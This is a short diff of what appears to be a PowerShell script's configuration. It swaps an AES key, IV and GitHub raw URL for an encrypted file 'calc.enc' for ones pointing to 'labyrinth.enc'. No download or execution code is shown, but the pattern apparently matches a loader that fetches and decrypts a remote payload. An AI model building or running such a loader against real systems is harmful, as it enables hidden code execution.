@@ -1,6 +1,3 @@
-#$key_b64   = "JxkIC5hdeFn22yHVp+BXlkhKnfqkNyh733dhlHGfk4g="
-#$iv_b64    = "40s4YD1TaV08ZTOdrn1eoA=="
-#$url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/calc.enc"
 $key_b64   = "P+zcMUiVdfCg+qm2jpBfg4BSNHNX16FKgbUncJIQc2U="
 $iv_b64    = "lQekH4XYZ4W5yE+gZg4inw=="
 $url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/labyrinth.enc"
